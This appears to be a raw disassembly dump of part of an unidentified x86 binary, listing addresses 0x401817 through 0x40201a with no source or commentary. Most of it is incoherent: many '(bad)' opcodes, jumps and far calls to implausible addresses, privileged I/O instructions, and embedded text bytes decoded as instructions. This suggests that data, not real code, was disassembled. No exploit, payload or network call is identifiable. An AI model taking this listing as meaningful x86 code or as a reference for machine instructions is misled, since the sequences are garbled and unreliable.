  401817:	mov    cx,WORD PTR [ebx-0x7474ee67]
  40181e:	dec    edi
  40181f:	mov    ecx,DWORD PTR gs:[ebx+0x7b536c85]
  401826:	push   eax
  401827:	dec    eax
  401828:	pop    edx
  401829:	xchg   edx,eax
  40182a:	mov    ebp,0x64d44a9
  40182f:	aaa    
  401830:	jae    0x4017fe
  401832:	fsub   DWORD PTR [ecx-0x26]
  401835:	mov    DWORD PTR [ecx-0x36],ebp
  401838:	jg     0x40187f
  40183a:	mov    edi,edi
  40183c:	cmpxchg DWORD PTR [ecx+0x33],ebx
  401840:	(bad)  
  401841:	(bad)  
  401842:	call   FWORD PTR [esi+0x1d]
  401845:	outs   dx,BYTE PTR ds:[esi]
  401846:	ins    BYTE PTR es:[edi],dx
  401847:	scas   al,BYTE PTR es:[edi]
  401848:	fst    DWORD PTR [ecx-0x14844d81]
  40184e:	test   eax,0xca245f35
  401853:	iret   
  401854:	cmp    al,0x6c
  401856:	pop    ecx
  401857:	mov    ds:0x359c8567,al
  40185c:	and    BYTE PTR [ebx],ah
  40185e:	call   0x6f4a:0x2dd8fdb5
  401865:	mov    ebp,0x3f09ffff
  40186a:	(bad)  
  40186b:	(bad)  
  40186c:	dec    DWORD PTR [eax]
  40186e:	or     BYTE PTR [eax],cl
  401870:	or     BYTE PTR [eax],cl
  401872:	or     BYTE PTR [eax],cl
  401874:	or     BYTE PTR [eax],cl
  401876:	xor    eax,0x1f9f
  40187b:	add    BYTE PTR [eax],al
  40187d:	add    BYTE PTR [eax],al
  40187f:	add    BYTE PTR [eax],al
  401881:	add    BYTE PTR [ebp-0x40653073],cl
  401887:	and    eax,0x65f9f838
  40188c:	aam    0x14
  40188e:	mov    bh,0xa3
  401890:	sbb    eax,0xdf66f220
  401895:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401896:	jne    0x4018a3
  401898:	ret    0x4f8
  40189b:	loope  0x40182a
  40189d:	(bad)  
  40189e:	aad    0x39
  4018a0:	iret   
  4018a1:	xchg   esi,eax
  4018a2:	jno    0x4018bb
  4018a4:	pop    eax
  4018a5:	popa   
  4018a6:	mov    dh,0x7a
  4018a8:	call   0x2521840d
  4018ad:	repz dec edi
  4018af:	fcos   
  4018b1:	(bad)  
  4018b2:	rol    DWORD PTR [eax+0x4e51f2d8],cl
  4018b8:	nop
  4018b9:	shld   DWORD PTR [ebp-0x3b9b3e73],ecx,0x8d
  4018c1:	(bad)  
  4018c2:	retf   0x7f39
  4018c5:	lea    esp,[edx+esi*1]
  4018c8:	sbb    eax,0x8a965e73
  4018cd:	std    
  4018ce:	jns    0x40190b
  4018d0:	cli    
  4018d1:	retf   0x2545
  4018d4:	(bad)  
  4018d5:	call   0x237e:0xb8d18a49
  4018dc:	inc    eax
  4018dd:	call   0x24643d88
  4018e2:	inc    eax
  4018e3:	add    al,0x24
  4018e5:	and    al,0x35
  4018e7:	xchg   esp,eax
  4018e8:	and    al,0x24
  4018ea:	and    al,0x0
	...
  4018f4:	adc    edi,DWORD PTR [esi+0x29]
  4018f7:	hlt    
  4018f8:	test   BYTE PTR [edi+edx*8+0x4dd3940d],dh
  4018ff:	xchg   esi,eax
  401900:	stc    
  401901:	neg    BYTE PTR [edi]
  401903:	mov    bl,0x7a
  401905:	dec    ebx
  401906:	xor    BYTE PTR [edx*2+0x743ffa13],al
  40190d:	je     0x401983
  40190f:	je     0x401985
  401911:	je     0x401987
  401913:	je     0x401989
  401915:	mov    ecx,DWORD PTR [ebx+0x1b59d936]
  40191b:	mov    ecx,DWORD PTR [ebx-0x591e1ccf]
  401921:	pop    edi
  401922:	inc    ebx
  401923:	mov    ds:0xe777815,al
  401928:	xor    al,0x86
  40192a:	add    cl,BYTE PTR es:[edi]
  40192d:	push   ebp
  40192e:	mov    cl,0xca
  401930:	scas   eax,DWORD PTR es:[edi]
  401931:	fcom   st(1)
  401933:	mov    ds:0x205c3114,al
  401938:	pushf  
  401939:	jo     0x401926
  40193b:	les    eax,FWORD PTR [ebx+0x73]
  40193e:	mov    ds,WORD PTR [eax]
  401940:	mov    ecx,DWORD PTR [ebx-0x7474aa17]
  401946:	xor    ebp,eax
  401948:	and    cl,BYTE PTR [ebx-0x741ce196]
  40194e:	add    DWORD PTR [esi+0x20e132a1],0x57
  401955:	jmp    0xa6f1:0x82fed36c
  40195c:	sub    dl,BYTE PTR fs:[eax-0x1c]
  401960:	aam    0x6e
  401962:	addr16 sub al,0x53
  401965:	jns    0x4019da
  401967:	je     0x4019ce
  401969:	ins    DWORD PTR es:[edi],dx
  40196a:	cs push ebx
  40196c:	je     0x4019e0
  40196e:	imul   ebp,DWORD PTR [esi+0x67],0xd3e2229
  401975:	or     ah,BYTE PTR [eax]
  401977:	and    BYTE PTR [eax],ah
  401979:	and    BYTE PTR [edi+ebp*1],bh
  40197c:	ins    DWORD PTR es:[edi],dx
  40197d:	gs ins DWORD PTR es:[edi],dx
  40197f:	bound  esp,QWORD PTR [ebp+0x72]
  401982:	ds or  eax,0x2020200a
  401988:	and    BYTE PTR [ebp*2+0x65626d65],bh
  40198f:	jb     0x4019b1
  401991:	outs   dx,BYTE PTR ds:[esi]
  401992:	popa   
  401993:	ins    DWORD PTR es:[edi],dx
  401994:	gs cmp eax,0x4d3a4d22
  40199a:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  4019a1:	je     0x4019d1
  4019a3:	inc    esp
  4019a4:	gs jbe 0x4019e8
  4019a7:	jo     0x401a19
  4019a9:	jae    0x4019d9
  4019ab:	push   edi
  4019ac:	bound  edx,QWORD PTR gs:[ebx+0x2d]
  4019b0:	jmp    FWORD PTR [edx+0x6a]
  4019b3:	push   0xffffff83
  4019b5:	imul   esp,esp,0x667760c6
  4019bb:	mov    al,ds:0xc67c0603
  4019c0:	das    
  4019c1:	(bad)  
  4019c2:	xor    ch,BYTE PTR [esi+0x1b]
  4019c5:	jg     0x401975
  4019c7:	xor    cl,0xc0
  4019ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4019cb:	nop
  4019cc:	ds (bad) 
  4019ce:	mov    ah,0x8f
  4019d0:	cdq    
  4019d1:	push   0x6a
  4019d3:	ja     0x40196f
  4019d5:	dec    eax
  4019d6:	push   0x6a
  4019d8:	push   0xffffffff
  4019da:	(bad)  
  4019db:	(bad)  
  4019dc:	(bad)  
  4019dd:	(bad)  
  4019de:	(bad)  
  4019df:	(bad)  
  4019e0:	(bad)  
  4019e1:	inc    DWORD PTR [ecx]
  4019e3:	leave  
  4019e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4019e5:	or     al,0xc
  4019e7:	or     al,0xc
  4019e9:	or     al,0xc
  4019eb:	or     al,0xc
  4019ed:	or     al,0x0
  4019ef:	add    BYTE PTR [eax-0x7f],ch
  4019f2:	mov    bl,0xb1
  4019f4:	sbb    al,0xe1
  4019f6:	and    al,0x48
  4019f8:	or     al,0xc
  4019fa:	push   esp
  4019fb:	mov    esi,0xf7dd1202
  401a01:	leave  
  401a02:	adc    BYTE PTR [edi+ebp*8-0x29],bl
  401a06:	mov    bh,0x11
  401a08:	add    BYTE PTR [eax],al
  401a0a:	xchg   BYTE PTR [ecx+0x48d70000],dl
  401a10:	add    BYTE PTR [eax],al
  401a12:	xchg   ebx,eax
  401a13:	fisub  DWORD PTR [esi-0xcd5523f]
  401a19:	mov    eax,0x2de6c454
  401a1e:	stos   BYTE PTR es:[edi],al
  401a1f:	mov    db4,ecx
  401a22:	sbb    al,0x21
  401a24:	test   al,0x60
  401a26:	fistp  DWORD PTR [ebx]
  401a28:	scas   eax,DWORD PTR es:[edi]
  401a29:	add    BYTE PTR cs:[eax],al
  401a2c:	repnz aad 0x73
  401a2f:	add    eax,DWORD PTR [eax]
  401a31:	add    BYTE PTR [eax],al
  401a33:	push   0x59
  401a35:	mov    ds:0x35905bb6,eax
  401a3a:	popf   
  401a3b:	xchg   ebx,eax
  401a3c:	dec    edi
  401a3d:	in     eax,0x90
  401a3f:	les    ebx,FWORD PTR [ecx+0x31]
  401a42:	inc    ebx
  401a43:	jnp    0x401a42
  401a45:	dec    eax
  401a46:	inc    edx
  401a47:	and    al,0xe9
  401a49:	mov    ebp,DWORD PTR [ebp-0x77]
  401a4c:	cmp    BYTE PTR [edi+ebx*1+0x75],al
  401a50:	imul   ecx,DWORD PTR [edx-0x67],0x6d
  401a54:	jle    0x401abc
  401a56:	add    BYTE PTR [eax],al
  401a58:	lds    ax,DWORD PTR [eax]
	...
  401a63:	add    BYTE PTR [eax],al
  401a65:	add    dh,ah
  401a67:	mov    dh,0x5d
  401a69:	mov    ecx,DWORD PTR [ebx-0x74747475]
  401a6f:	mov    ecx,DWORD PTR [ebx-0x5a767675]
  401a75:	mov    edi,0x196d4f1
  401a7a:	jp     0x401a26
  401a7c:	and    dh,BYTE PTR [esi+0x23]
  401a7f:	pop    edx
  401a80:	daa    
  401a81:	mov    eax,0x52e29f2d
  401a86:	(bad)  
  401a87:	(bad)  
  401a88:	repz test cl,bh
  401a8b:	dec    DWORD PTR [ecx+0x588fa389]
  401a91:	js     0x401a2e
  401a93:	xlat   BYTE PTR ds:[ebx]
  401a94:	cdq    
  401a95:	lea    esp,[eax+0x33]
  401a98:	and    al,0xdc
  401a9a:	pop    ebx
  401a9b:	nop
  401a9c:	jb     0x401ab1
  401a9e:	retf   
  401a9f:	and    DWORD PTR [ebx+0x749379a2],eax
  401aa5:	ins    DWORD PTR es:[edi],dx
  401aa6:	idiv   DWORD PTR [eax-0x7688e875]
  401aac:	mov    DWORD PTR [esi],ebx
  401aae:	dec    esi
  401aaf:	loopne 0x401a3a
  401ab1:	mov    DWORD PTR [ebx-0x2e],esi
  401ab4:	sub    al,0x89
  401ab6:	mov    edi,ecx
  401ab8:	mov    ch,0x30
  401aba:	mov    bh,0x3c
  401abc:	push   esi
  401abd:	mov    bl,BYTE PTR [edi-0x4d]
  401ac0:	push   ebp
  401ac1:	jns    0x6e8c57f4
  401ac7:	sbb    ch,cl
  401ac9:	mov    esi,0xe7975cf4
  401ace:	js     0x401a5b
  401ad0:	mov    ecx,DWORD PTR [ebx-0x74749b46]
  401ad6:	cld    
  401ad7:	icebp  
  401ad8:	mov    ecx,DWORD PTR [ebx+0x8b]
  401ade:	add    BYTE PTR [eax],al
  401ae0:	add    BYTE PTR [eax],al
  401ae2:	add    BYTE PTR [eax],al
  401ae4:	push   eax
  401ae5:	mov    ecx,0x69d28bab
  401aea:	loopne 0x401af0
  401aec:	nop
  401aed:	pusha  
  401aee:	stos   DWORD PTR es:[edi],eax
  401aef:	mul    DWORD PTR [edi-0x3a]
  401af2:	mov    BYTE PTR [esi+0x70942ca],al
  401af8:	dec    ebx
  401af9:	adc    BYTE PTR [edi+0x63],0x0
	...
  401b05:	(bad)  
  401b06:	call   FWORD PTR [esi+0x5c]
  401b09:	mov    ebp,0x1bffffce
  401b0e:	outs   dx,DWORD PTR ds:[esi]
  401b0f:	adc    BYTE PTR [ebx],0xf9
  401b12:	add    eax,0xe6336969
  401b17:	test   ah,bl
  401b19:	adc    DWORD PTR [edx+0x12ca5a9d],ecx
  401b1f:	jl     0x401b24
  401b21:	dec    eax
  401b22:	daa    
  401b23:	inc    esi
  401b24:	push   esp
  401b25:	mov    edx,0x8e1b04d7
  401b2a:	xchg   esp,eax
  401b2b:	sbb    DWORD PTR [eax-0xc07ace],edi
  401b31:	dec    DWORD PTR [ecx+0x2a]
  401b34:	(bad)  
  401b35:	(bad)  
  401b36:	jl     0x401af1
  401b38:	push   ds
  401b39:	inc    DWORD PTR [eax]
  401b3b:	jbe    0x401b2a
  401b3d:	das    
  401b3e:	dec    edi
  401b3f:	ror    BYTE PTR [ebx],1
  401b41:	adc    bh,ch
  401b43:	mov    esp,0x38deed5
  401b48:	lock iret 
  401b4a:	fld    DWORD PTR [esi-0x27]
  401b4d:	mov    edx,0x139a0a7a
  401b52:	or     eax,DWORD PTR [eax]
  401b54:	add    BYTE PTR [eax],al
  401b56:	arpl   WORD PTR [esi],di
  401b58:	sbb    BYTE PTR [ebx+esi*2],bl
  401b5b:	mov    dh,0x70
  401b5d:	ror    DWORD PTR [eax+ebx*1-0x32f396d5],0xa0
  401b65:	fmul   QWORD PTR [eax-0x2e]
  401b68:	lods   eax,DWORD PTR ds:[esi]
  401b69:	mov    bl,0x17
  401b6b:	and    eax,0xa79b95d4
  401b70:	fisub  DWORD PTR ds:0x290000db
  401b76:	inc    edx
  401b77:	add    DWORD PTR [eax],eax
  401b79:	add    BYTE PTR [eax],al
  401b7b:	je     0x401bf1
  401b7d:	je     0x401bf3
  401b7f:	je     0x401bf5
  401b81:	je     0x401bf7
  401b83:	je     0x401b83
  401b85:	xchg   edi,eax
  401b86:	mov    eax,0x0
  401b8b:	add    BYTE PTR [eax],al
  401b8d:	add    BYTE PTR [eax],al
  401b8f:	add    BYTE PTR [ebp-0x75dca473],cl
  401b95:	mov    ecx,0x1ffa3e57
  401b9b:	push   edx
  401b9c:	inc    esp
  401b9d:	in     al,0x14
  401b9f:	data16 xchg BYTE PTR [esi],al
  401ba2:	add    BYTE PTR [ecx-0x57],al
  401ba5:	inc    esi
  401ba6:	adc    cl,BYTE PTR [esi+ebx*8]
  401ba9:	sub    eax,0x6de18d8d
  401bae:	lea    ecx,[ebp-0x72726e95]
  401bb4:	push   eax
  401bb5:	mov    edx,DWORD PTR [esi+0x7]
  401bb8:	(bad)  
  401bb9:	int    0x18
  401bbb:	fsubp  st(1),st
  401bbd:	sbb    al,0x23
  401bbf:	adc    DWORD PTR [ebp-0x49603539],ebp
  401bc5:	lds    ebx,FWORD PTR [esi+0x31]
  401bc8:	add    BYTE PTR [esi+0x8db8cb],bh
  401bce:	adc    edi,edx
  401bd0:	int    0xc0
  401bd2:	add    BYTE PTR [eax],al
  401bd4:	add    BYTE PTR [ebx-0x73],dh
  401bd7:	out    dx,al
  401bd8:	xchg   bl,bl
  401bda:	dec    esp
  401bdb:	fcom   DWORD PTR [edi+0x33e16e9]
  401be1:	loope  0x401c14
  401be3:	shl    DWORD PTR [ecx-0x58],0x37
  401be7:	leave  
  401be8:	add    al,0x49
  401bea:	adc    eax,0x6357a560
  401bef:	or     ah,BYTE PTR [ebp+0x62]
  401bf2:	cs inc sp
  401bf5:	jne    0x401c65
  401bf7:	gs outs dx,BYTE PTR gs:[esi]
  401bfa:	sub    BYTE PTR [esi+edi*1+0x74],ch
  401bfe:	inc    esp
  401bff:	gs gs ins DWORD PTR es:[edi],dx
  401c02:	ins    DWORD PTR es:[edi],dx
  401c03:	inc    ecx
  401c04:	gs je  0x401c6c
  401c07:	jb     0x401c72
  401c09:	arpl   WORD PTR [ebx+0x69],sp
  401c0c:	push   eax
  401c0d:	and    cl,BYTE PTR [ebp+0x72]
  401c10:	gs addr16 jb 0x401c53
  401c14:	and    BYTE PTR [ebp+0x50],ah
  401c17:	outs   dx,BYTE PTR gs:[esi]
  401c19:	or     eax,0x416f3e2e
  401c1e:	cs jae 0x401c93
  401c21:	arpl   WORD PTR [edx+0x63],si
  401c24:	and    BYTE PTR [esi],ch
  401c26:	outs   dx,BYTE PTR ds:[esi]
  401c27:	js     0x401c49
  401c29:	cs cmp al,0x70
  401c2c:	outs   dx,BYTE PTR ds:[esi]
  401c2d:	jb     0x401ca2
  401c2f:	popa   
  401c30:	ins    DWORD PTR es:[edi],dx
  401c31:	and    ah,BYTE PTR [ebx]
  401c33:	ins    DWORD PTR es:[edi],dx
  401c34:	outs   dx,DWORD PTR ds:[esi]
  401c35:	and    dh,BYTE PTR [bp+0x2e]
  401c39:	dec    edi
  401c3a:	and    BYTE PTR ds:[ecx+0x6d],al
  401c3e:	jae    0x401cb4
  401c40:	jne    0x401ca7
  401c42:	jns    0x401cb1
  401c44:	arpl   WORD PTR [ebp+0x41],sp
  401c47:	and    ch,BYTE PTR [ecx+0x20]
  401c4a:	jb     0x401cbb
  401c4c:	gs ins DWORD PTR es:[edi],dx
  401c4e:	and    bh,BYTE PTR [esp+esi*2]
  401c51:	jb     0x401cc9
  401c53:	push   edi
  401c54:	and    BYTE PTR [eax],ah
  401c56:	imul   ebp,DWORD PTR [ecx],0x3e202042
  401c5c:	jae    0x401cd0
  401c5e:	imul   ebp,DWORD PTR [esi+0x45],0x3c6d2e73
  401c65:	pop    es
  401c66:	sub    esp,DWORD PTR [esp+edx*2+0x3b]
  401c6a:	pop    ebp
  401c6b:	lahf   
  401c6c:	rcr    DWORD PTR gs:[eax-0x12],0x0
  401c71:	add    BYTE PTR [edi+edx*4],dl
	...
  401c80:	or     BYTE PTR [edi-0x6],bh
  401c83:	inc    ebp
  401c84:	inc    ebp
  401c85:	inc    ebp
  401c86:	inc    ebp
  401c87:	inc    ebp
  401c88:	inc    ebp
  401c89:	inc    ebp
  401c8a:	inc    ebp
  401c8b:	inc    ebp
  401c8c:	add    BYTE PTR [eax],al
  401c8e:	fs dec esp
  401c90:	push   ds
  401c91:	pop    edx
  401c92:	xor    eax,0xdf677f88
  401c97:	lahf   
  401c98:	popf   
  401c99:	xor    DWORD PTR [ebp+ecx*4-0x3aabe3df],ebp
  401ca0:	jl     0x401cf9
  401ca2:	or     ebp,DWORD PTR [esi+0x3340]
  401ca8:	dec    ebp
  401ca9:	je     0x401cea
  401cab:	es sahf 
  401cad:	sub    ah,al
  401caf:	bound  esi,QWORD PTR [esi+0x54]
  401cb2:	out    0xa3,al
  401cb4:	inc    ecx
  401cb5:	sub    ebp,eax
  401cb7:	jp     0x401cf5
  401cb9:	sub    ebx,DWORD PTR [edx+0x6d]
  401cbc:	in     al,dx
  401cbd:	es cmc 
  401cbf:	and    ch,0x6a
  401cc2:	in     al,0x77
  401cc4:	dec    esi
  401cc5:	add    BYTE PTR [eax],al
  401cc7:	test   BYTE PTR [edx-0x60ffffbd],0xf5
  401cce:	mov    WORD PTR [eax],es
  401cd0:	push   0xffffff90
  401cd2:	ret    0x7e49
  401cd5:	jp     0x401d34
  401cd7:	jecxz  0x401cee
  401cd9:	(bad)  
  401cda:	xor    eax,0x4e99bcf
  401cdf:	sar    DWORD PTR [esi],cl
  401ce1:	add    al,0x35
  401ce3:	mov    ecx,DWORD PTR [esi-0x18]
  401ce6:	mov    ebx,0x6a6a6adc
  401cec:	xor    eax,0xcd6a6a3f
  401cf1:	fild   QWORD PTR [edx+0x6a]
  401cf4:	push   0x75
  401cf6:	jne    0x401d6d
  401cf8:	jne    0x401d6f
  401cfa:	jne    0x401d71
  401cfc:	jne    0x401d73
  401cfe:	jnp    0x401d12
  401d00:	mov    al,0x6a
  401d02:	loopne 0x401cf6
  401d04:	xor    eax,DWORD PTR [edx+0x4]
  401d07:	mov    edi,0xca141490
  401d0c:	dec    esi
  401d0d:	and    eax,0x5196f089
  401d12:	test   al,0xc1
  401d14:	loop   0x401d72
  401d16:	(bad)  
  401d17:	(bad)  
  401d18:	(bad)  
  401d19:	(bad)  
  401d1a:	(bad)  
  401d1b:	(bad)  
  401d1c:	(bad)  
  401d1d:	(bad)  
  401d1e:	(bad)  
  401d1f:	(bad)  
  401d20:	jmp    FWORD PTR [edx+edi*1]
  401d23:	retf   
  401d24:	cmp    edi,0x614916ff
  401d2a:	lock push ecx
  401d2c:	and    eax,0x59018aeb
  401d31:	sbb    dh,BYTE PTR [eax+0x6e6e003b]
  401d37:	stos   BYTE PTR es:[edi],al
  401d38:	push   edi
  401d39:	or     BYTE PTR [ebp-0x390cf4ac],al
  401d3f:	sbb    al,0x5b
  401d41:	pop    esi
  401d42:	in     eax,0xa8
  401d44:	clc    
  401d45:	xchg   esi,esi
  401d47:	mov    dh,0x1d
  401d49:	sbb    edi,edi
  401d4b:	dec    DWORD PTR [ebp-0x1d000015]
  401d51:	xor    DWORD PTR [ecx],eax
  401d53:	inc    DWORD PTR [ebp+0x3d]
  401d56:	push   0xffffffb9
  401d58:	(bad)  
  401d59:	and    al,0x6b
  401d5b:	(bad)  
  401d5c:	repnz sar BYTE PTR ds:0xfedd6c96,0x8
  401d64:	scas   al,BYTE PTR es:[edi]
  401d65:	pushf  
  401d66:	xchg   edi,eax
  401d67:	test   eax,0x1b8e867
  401d6c:	test   eax,0xaa454545
  401d71:	mov    ch,BYTE PTR [ecx]
  401d73:	in     al,0xaf
  401d75:	sbb    ebp,edi
  401d77:	push   esi
  401d78:	into   
  401d79:	lods   al,BYTE PTR ds:[esi]
  401d7a:	dec    edi
  401d7b:	shr    bh,cl
  401d7d:	mov    dl,0x54
  401d7f:	adc    al,0x46
  401d81:	cmp    eax,0x6979733c
  401d86:	sar    DWORD PTR [eax+0x1a],1
  401d89:	inc    ebp
  401d8a:	adc    ebp,DWORD PTR [ebx+0x31]
  401d8d:	inc    ebp
  401d8e:	inc    ebp
  401d8f:	aad    0x57
  401d91:	in     al,0x45
  401d93:	inc    ebp
  401d94:	inc    ebp
	...
  401d9d:	add    BYTE PTR [eax],bh
  401d9f:	mov    BYTE PTR [ecx],0x0
	...
  401daa:	mov    ecx,DWORD PTR [ebx+0xe71d11c]
  401db0:	sub    dh,BYTE PTR [ecx-0x51]
  401db3:	xchg   BYTE PTR [edi+0x3d8b01b8],bh
  401db9:	push   ecx
  401dba:	outs   dx,DWORD PTR gs:[esi]
  401dbc:	mov    edi,0x6c2d73e1
  401dc1:	push   edx
  401dc2:	mov    eax,0x198b8bd0
  401dc7:	dec    ebp
  401dc8:	mov    ecx,DWORD PTR [ebx-0x7474d633]
  401dce:	adc    edx,eax
  401dd0:	or     eax,DWORD PTR [esp+ebp*4-0x2]
  401dd4:	retf   0x45bf
  401dd7:	mov    ebp,0x6dd603c0
  401ddc:	dec    ebx
  401ddd:	cmc    
  401dde:	outs   dx,DWORD PTR ds:[esi]
  401ddf:	push   edx
  401de0:	push   es
  401de1:	xor    al,0xce
  401de3:	jmp    0x9ca9:0x8b1e5c
  401dea:	push   ebp
  401deb:	sub    DWORD PTR [eax],eax
  401ded:	add    BYTE PTR [eax],al
  401def:	imul   edi,DWORD PTR [ebx+0x7f],0x1
  401df3:	jae    0x401da4
  401df5:	push   edi
  401df6:	inc    esi
  401df7:	fild   QWORD PTR [ebx+0x7512c2ec]
  401dfd:	jno    0x401e53
  401dff:	out    dx,al
  401e00:	or     edi,esp
  401e02:	sbb    esi,ebp
  401e04:	pop    esi
  401e05:	neg    esp
  401e07:	pop    ecx
  401e08:	mov    DWORD PTR [ecx-0x699b4aca],esp
  401e0e:	mov    ds,WORD PTR [edx+0x4f]
  401e11:	ins    DWORD PTR es:[edi],dx
  401e12:	add    BYTE PTR [eax],al
  401e14:	add    al,0xda
	...
  401e22:	push   0x4d
  401e24:	push   edi
	...
  401e2d:	add    BYTE PTR [ebp+0x28aad98d],cl
  401e33:	mov    ebx,0x87b621e7
  401e38:	push   cs
  401e39:	arpl   WORD PTR [eax],dx
  401e3b:	pop    es
  401e3c:	shl    BYTE PTR [edi-0x4],1
  401e3f:	fcomp  DWORD PTR [ebp+0x72d7c7db]
  401e45:	int    0x34
  401e47:	arpl   WORD PTR [ebp-0x50840673],cx
  401e4d:	push   ds
  401e4e:	sub    edi,edx
  401e50:	xchg   edx,eax
  401e51:	or     eax,0xf37a4b86
  401e56:	fs mov ebx,0x7ed6c60f
  401e5c:	cmp    BYTE PTR [esi],0xbd
  401e5f:	retf   
  401e60:	fld    DWORD PTR [edx+esi*8]
  401e63:	(bad)  
  401e64:	dec    ebp
  401e65:	fld    TBYTE PTR [ebp-0x73]
  401e68:	lea    ebp,[ebp-0x7272b79f]
  401e6e:	xor    DWORD PTR [eax-0x20],ebp
  401e71:	lea    eax,[eax]
  401e73:	call   0x5b4b0957
  401e78:	mov    esi,0xe813bbad
  401e7d:	dec    ecx
  401e7e:	or     bh,cl
  401e80:	out    dx,al
  401e81:	push   esp
  401e82:	fdivr  QWORD PTR [edi]
  401e84:	das    
  401e85:	push   cs
  401e86:	push   cs
  401e87:	in     al,dx
  401e88:	cdq    
  401e89:	call   0x5e23:0xe5
  401e90:	add    BYTE PTR [eax],al
  401e92:	outs   dx,BYTE PTR ds:[esi]
  401e93:	push   edi
  401e94:	add    BYTE PTR [eax],al
  401e96:	add    BYTE PTR [esp+eax*1],al
  401e99:	add    al,0x4
  401e9b:	add    al,0x4
  401e9d:	add    al,0x4
  401e9f:	add    al,0xc4
  401ea1:	or     DWORD PTR [ebx-0x48],eax
  401ea4:	and    ebp,DWORD PTR [ebp-0x5a172865]
  401eaa:	ins    BYTE PTR es:[edi],dx
  401eab:	add    esp,DWORD PTR [esi]
  401ead:	sbb    BYTE PTR [ecx-0x45],ch
  401eb0:	stc    
  401eb1:	jae    0x401e95
  401eb3:	pop    ss
  401eb4:	sub    al,0x1d
  401eb6:	cwde   
  401eb7:	clc    
	...
  401ec0:	add    bh,bh
  401ec2:	inc    esp
  401ec4:	and    al,0xa1
  401ec6:	(bad)  
  401ec7:	(bad)  
  401ec8:	(bad)  
  401ec9:	ds lahf 
  401ecb:	cdq    
  401ecc:	adc    al,0xb2
  401ece:	pop    ecx
  401ecf:	call   0x40a0d701
  401ed4:	xchg   edx,eax
  401ed5:	stos   DWORD PTR es:[edi],eax
  401ed6:	adc    BYTE PTR [eax],0x32
  401ed9:	xchg   dl,bl
  401edb:	in     eax,0xd6
  401edd:	add    edi,DWORD PTR ds:0xb2e3c5a8
  401ee3:	stos   BYTE PTR es:[edi],al
  401ee4:	sub    eax,0x359e5c32
  401ee9:	sbb    BYTE PTR ds:0xc5ffff18,dh
  401eef:	and    bh,bh
  401ef1:	jmp    ebx
  401ef3:	cmp    al,0x28
  401ef5:	(bad)  
  401ef6:	call   0x8e3cab05
  401efb:	cld    
  401efc:	dec    eax
  401efd:	fadd   QWORD PTR [ecx-0x7d]
  401f00:	jp     0x401f2a
  401f02:	in     eax,0xc9
  401f04:	jge    0x401ebe
  401f06:	pop    ds
  401f07:	or     BYTE PTR [eax+0x7],0xa3
  401f0b:	mov    cl,0xd3
  401f0d:	inc    edx
  401f0e:	(bad)
  401f11:	call   0x8068e9b3
  401f16:	cli    
  401f17:	mov    ah,BYTE PTR [eax-0x76]
  401f1a:	je     0x401f01
  401f1c:	aaa    
  401f1d:	mov    ebx,0x97924fe8
  401f22:	add    BYTE PTR [ecx-0x28],dl
  401f25:	jle    0x401ee6
  401f27:	nop
  401f28:	adc    dl,BYTE PTR [ebp-0x14923e62]
  401f2e:	cs call 0xa360751c
  401f34:	call   0x410821
  401f39:	add    BYTE PTR [eax],al
  401f3b:	add    BYTE PTR [eax],al
  401f3d:	add    BYTE PTR [eax],al
  401f3f:	add    dh,ah
  401f41:	cmp    esi,DWORD PTR [ecx]
	...
  401f4b:	add    BYTE PTR [ebp-0x6e14257b],al
  401f51:	in     al,0x1c
  401f53:	sbb    cl,BYTE PTR [ebx-0x7586a7d1]
  401f59:	ret    
  401f5a:	inc    BYTE PTR [esp+edx*8+0x60]
  401f5e:	add    al,0xca
  401f60:	scas   eax,DWORD PTR es:[edi]
  401f61:	test   eax,0xb9a825a7
  401f66:	test   DWORD PTR [ebp-0x7a7a1305],eax
  401f6c:	and    BYTE PTR [ebp+0x65db8585],dl
  401f72:	push   0x3df482e9
  401f77:	test   BYTE PTR [esp+esi*4-0x20eed7f0],bh
  401f7e:	(bad)  
  401f80:	loopne 0x401f3a
  401f82:	icebp  
  401f83:	bound  ebx,QWORD PTR [edx]
  401f85:	mov    eax,0xe8858084
  401f8a:	xor    DWORD PTR [esi],ecx
  401f8c:	bound  edx,QWORD PTR [ebx+0x58e8e8e8]
  401f92:	adc    BYTE PTR [ebx+0x3f],0x8
  401f96:	xchg   ecx,eax
  401f97:	and    al,0x99
  401f99:	add    ah,BYTE PTR [edi+0x57]
  401f9c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401f9d:	shl    DWORD PTR [eax+0x55],cl
  401fa0:	push   edx
  401fa1:	jo     0x401ff6
  401fa3:	push   0xe8137eb3
  401fa8:	psrad  mm1,QWORD PTR [esi]
  401fab:	jecxz  0x401f6f
  401fad:	scas   al,BYTE PTR es:[edi]
  401fae:	ret    0x3fcd
  401fb1:	fst    DWORD PTR [ecx+0x7b]
  401fb4:	call   0xe905e3a1
  401fb9:	call   0x8dcdada6
  401fbe:	lea    ecx,[ebp-0x72727273]
  401fc4:	xchg   BYTE PTR [esi],al
  401fc6:	pop    edx
  401fc7:	(bad)  
  401fc8:	(bad)  
  401fc9:	(bad)  
  401fca:	(bad)  
  401fcb:	(bad)  
  401fcc:	(bad)  
  401fcd:	(bad)  
  401fce:	(bad)  
  401fcf:	inc    DWORD PTR [eax]
  401fd1:	add    BYTE PTR [ecx+0x37],bh
  401fd4:	mov    edx,0x37b39218
  401fd9:	push   es
  401fda:	cli    
  401fdb:	aas    
  401fdc:	push   ebp
  401fdd:	pop    esp
  401fde:	in     al,0xb2
  401fe0:	dec    eax
  401fe1:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  401fe3:	cmp    eax,0x4970ac67
  401fe8:	ds dec bp
  401feb:	cs cs jo 0x40205e
  401fef:	arpl   WORD PTR [ecx+0x20],sp
  401ff2:	and    BYTE PTR [eax],ah
  401ff4:	arpl   WORD PTR [ebp+0x76],sp
  401ff7:	jb     0x40204c
  401ff9:	jo     0x40206f
  401ffb:	jae    0x40201d
  401ffd:	gs ds push edi
  402000:	ds ins DWORD PTR es:[edi],dx
  402002:	or     ah,BYTE PTR gs:[eax]
  402005:	and    BYTE PTR [edx],cl
  402007:	arpl   WORD PTR cs:[ebp+0x64],bp
  40200b:	push   ebx
  40200c:	imul   esi,DWORD PTR [esi+0x62],0x7269693a
  402013:	or     eax,0x73206569
  402018:	jns    0x402083
  40201a:	arpl   WORD PTR [ebp+0x69],bp
